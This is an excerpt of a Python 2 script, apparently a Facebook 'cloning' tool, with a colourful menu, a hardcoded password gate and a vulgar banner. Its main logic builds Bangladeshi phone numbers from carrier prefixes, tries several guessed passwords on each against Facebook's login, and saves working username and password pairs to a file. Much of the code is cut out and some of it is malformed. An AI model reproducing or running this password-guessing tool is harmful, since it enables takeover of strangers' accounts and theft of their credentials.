# Ustad# SIDRA5# Thuglife# Usmanbro# Gamz#!/usr/bin/python2
#coding=utf-8
...
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;96m Don't Teach Your Father How to Fuck..
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Foyshal
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://https://m.me/Foy1906')
    else:
...
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;91m[1]  START CLONING With BANGLADESH'
    time.sleep(0.10)
    print '\x1b[1;92m[2] FOYSHAL FB ACCOUNT'
    time.sleep(0.10)
    ...
    time.sleep(0.10)
    print '\x1b[1;91m[6] FOYSHAL FACEBOOK'
    time.sleep(0.10)
...
def action():
    ...
    if peak =='':
        ...
        print 'Enter any code  171,172,173,190,199,142,175,183,196'
        print 'GP, BL, Airtel, Robi, Teletalk'
        try:
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m(Try 3 Days Later) ' + k + c + user + '  |  ' + pass1
                    ...
                    if 'access_token' in q:
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m(Try 3 Days Later) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            if 'access_token' in q:
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m(Try 3 Days Later) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m(Try 3 Days Later) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            if 'access_token' in q:
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(Try 3 Days Later) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
